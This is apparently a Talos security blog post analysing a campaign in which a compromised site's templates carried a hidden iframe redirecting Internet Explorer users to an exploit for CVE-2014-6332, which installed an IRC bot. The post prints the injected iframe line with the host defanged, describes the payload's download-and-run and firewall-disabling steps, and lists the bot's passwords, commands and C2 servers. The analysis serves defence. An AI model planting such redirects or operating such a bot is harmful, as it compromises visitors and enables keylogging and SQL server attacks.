@@ -1,0 +1,181 @@
+
+Ancient Mac Site Harbors Botnet that Exploits IE Vulnerability
+
+
+This post was authored by Alex Chiu and Shaun Hurley.
+
+Last month, Microsoft released a security bulletin to patch CVE-2014-6332, a vulnerability within Windows Object Linking and Embedding (OLE) that could result in remote code execution if a user views a maliciously crafted web page with Microsoft Internet Explorer. Since then, there have been several documented examples of attackers leveraging this vulnerability and attempting to compromise users. On November 26th, Talos began observing and blocking an attack disguised as a hidden iframe on a compromised domain to leverage this vulnerability and compromise Internet Explorer users.
+
+
+A High Level Look at the Attack
+
+One attack vector that has been highly effective in the past is compromising and leveraging a vulnerable site to direct users to malware.  In this attack, attackers had inserted malicious code to silently redirect users (without visual indication) to another page containing malware.  Talos observed that the attackers had compromised *.aakash.ac.in and edited the HTML page templates to include this single line at the bottom before the closing </html> tag:
+<iframe src="hxxp://macport[.]com/vga.html" width="0" height="0"></iframe>
+
+
+The iframe is used to direct users to the malware landing page hosted at macport.com without any visual indication or intervention on behalf of the user.  Since there is no user indication or interaction required, users are unaware that the original host they’ve navigated to is compromised.
+
+The attackers also utilized a compromised domain to disguise their attack as benign traffic.  If we pay close attention to the URL that users were covertly redirected to, we see that they are redirected to macport.com, which is nearly identical to the actual domain used by the MacPorts open source project, macports.org.  Users might assume that macport.com is afilliated with the actual macports.org. It is not.
+
+Macport.com appears to be a legitimate domain that previously hosted a Mac OS Software Store, but has since then removed all content.  Unfortunately, the domain was compromised and hijacked for malicious purposes.  Talos alerted the owner to the compromise of their domain.  At the time of writing, it appears that the owner has taken action to remove the malware.  Ironically, the use of a compromised domain to disguise traffic and make it appear like benign Mac OS X user traffic in the traffic logs is notable given that Internet Explorer users were the intended targets.
+
+The good news is that over half of the traffic that we observed in this attack were from users who were using a browser other than Internet Explorer, meaning that over half of the users exposed to this attack were not at risk of becoming compromised.  The following graphic shows the distribution of Internet Explorer versions observed among users who were exposed to the attack against all the other browsers (Chrome, Firefox, Safari) grouped together.  As a side note, it’s not immediately possible to determine if Internet Explorer users were fully patched before being exposed to this attack.  This means there’s a probability that, even if Internet Explorer was used, the user was not at risk of being compromised.
+
+
+
+Figure 1: The browser distribution observed in this attack.
+
+
+
+
+
+Overall, the indiscriminate intention to compromise as many Internet Explorer users as possible in this attack was significant. Talos observed quite a number of customers across several verticals being exposed to this attack. In particular, we observed users in the following verticals were exposed to this attack:
+
+
+Banking & Finance
+Charities & NGO
+Energy, Oil, and Gas
+IT & Telecommunications
+Manufacturing
+Pharmaceutical & Chemical
+Retail & Wholesale
+
+
+The good news: Cisco Cloud Web Security (CWS) and Web Security Appliance (WSA) customers were automatically protected from this attack without any human intervention. This means that customers who were not up-to-date with their system patching and who were potentially exposed to this attack were not compromised.
+
+
+Breaking Down the Attack
+
+As we noted in the beginning, there have been several documented attempts of attackers exploiting CVE-2014-6332 out in the wild and this campaign is another example of this sort of activity.  In this instance, an exploit for this vulnerability was combined with a compromised host redirecting people to the actual malware.  As a result, there were two major technical components in redirecting users to the malware: the landing page and the malware dropped.
+
+When Talos first started to analyze the landing page, we realized that the landing page was a virtually identical copy of the Metasploit module that had been released for this vulnerability.  The only difference between the module and the exploit used in the campaign were the 4 lines specifying what remote command to execute on the client box.  The following images show the difference between the original proof-of-concept and the modified code used in the attack.
+
+
+
+Figure 2: The original runmumaa() function found in the Metasploit module.
+
+
+
+
+
+
+
+Figure 3: The modified runmumaa() function used in this exploit. (Click to Enlarge)
+
+
+
+
+
+In the original Metasploit module, the code just creates a new Shell Application object and immediately opens notepad.exe. The modified version of this exploit does not do that, but instead creates a Windows Scripting Shell object and attempts to use Windows PowerShell to carry out the dropping stage of the attack. We see that the exploit code attempts to download an executable, store it in the C:\Windows\Temp directory, and execute it.  On top of that, we also see the exploit code attempts to shut off the Windows Firewall. The reason for that is significant and leads us right into breaking down the executable dropped.
+
+Upon initial discovery the file was unknown to sites like VirusTotal. The executable that gets dropped, VgaDriver.exe (SHA256: f6dfea954b4cb6fd0e737a7b806039e5490224e692123105fbf947541d73550b) turns out to be nothing more than a RAR file containing two files that get unpacked and dropped into C:\Windows\System32 on the client machine:
+
+
+MSWINSCK.OCX (bf7e47c16d7e1c0e88534f4ef95e09d0fd821ed1a06b0d95a389b35364b63ff5)
+vga.exe (aa99e3d8e784fbae2c6395d17eff0da9c5fe410ab2db3e1f71509f010e3f2005)
+
+
+MSWINSCK.OCX appears to be a legitimate ActiveX file. However, vga.exe is an IRC bot that connects to a command-and-control server. The primary purpose of this bot appears to be the ability to target servers that run MS-SQL Server. This explains why the Visual Basic code on the landing page attempted to shut down the Windows Firewall.
+
+The bot loops through an IRC Server list to connect to an IRC server on port 2015.  Once connected to an IRC server, the bot joins the channel “#websites” using the channel password “g0dl1k3”. The bot then remains idle in the channel until the botmaster chooses to authenticate himself and gain control of the bot using the “!login” command and using the password “1243g0dl1k31243”. As an important note, the #websites channel the bot joins typically has +v mode enabled, meaning that only those with voice or above can communicate with everyone in the channel. We assume this was done to prevent other people from hijacking the botnet.
+
+In our analysis, we were able to redirect which server the bot connects to, to an internal IRC server we setup in order to interact with the bot and identify functionality. The bot interacts with the infected system and provides the following functionality via '!' IRC actions to the botmaster:
+
+
+!login <pass>
+!keyon
+!keyoff
+!floodsql
+!stopflood
+!enter
+!tab
+!version
+!die
+!runprog
+!mkdir
+!rmdir
+!del
+!sqlserver
+!sqlpass
+!sqluser
+!sqltimer
+!sqlquery
+!op
+!deop
+!voice
+!devoice
+!ban
+!unban
+!kick
+!say
+!tban
+!mode
+!ignore
+!unignore
+
+
+To clarify, these actions allow the botmaster to issue commands to the bots to:
+
+
+manipulate MSSQL Servers via logging in, querying, and flooding.
+enable or disable keylogging.
+create or delete directories.
+run programs.
+execute generic IRC channel controls (ban, ignore, etc).
+
+
+The following is an example of these capabilities we found in our analysis. (Note: This was our own internal IRC server. Thus, +v was not enabled for the channel.)
+
+
+
+Figure 4: Our interaction with the bot. (Click to Enlarge)
+
+
+
+
+
+Concluding our technical analysis, the keylogging and remote command execution abilities of this IRC bot alone pose a serious threat for users and organizations.  These abilities allow the botmaster to direct each bot to potentially download and execute additional code or enable keylogging to capture sensitive user data. The ability to manipulate MS-SQL servers and cause a denial of service attack via flooding is also a significant threat to organizations who rely on MS-SQL Server as an application backend.
+
+
+Relevant Links and Other Information
+
+Metasploit Module used in this attack:
+http://www.rapid7.com/db/modules/exploit/windows/browser/ms14_064_ole_code_execution
+
+The following are the IRC servers the bot attempt to connect to.
+
+
+313.legend.rocks
+sex.legend.rocks
+209.54.57.97
+85.214.135.193
+irc.rankand.hits.com
+
+
+Malware Landing Page and Executable (For Reference):
+
+
+hxxp://macport[.]com/vga.html
+hxxp://macport[.]com/VgaDriver.exe
+
+
+
+Conclusion
+
+The malware distributed in this campaign poses a serious threat to users and organizations.  The capacity to keylog, create and remove directories, execute programs, and manipulate MS-SQL servers, including flooding them with traffic, at best can cause headaches and worst, result in the loss of sensitive information. In addition, the race between patching and exploitation will continue to remain a problem for people who choose to delay patching systems with critical updates.  This attack is another example of how important it is apply patches as soon as they are made available. In the case where users and organizations are unable to patch in a timely manner, they should make sure they reduce the risk of being compromised by using browsers with an effective automatic updating mechanism, such as Chrome and Firefox.
+
+
+Protecting Users Against These Threats
+
+
+
+Advanced Malware Protection (AMP) is well suited to detect and block this type of attack.
+
+CWS or WSA web scanning will prevent access to malicious websites and detect the malware used in this attack.
+
+The Network Security protection ofIPS andNGFW have up-to-date signatures and will block this threat.
+
+ESA is not applicable for this attack because this threat is not using email.
+
+
+
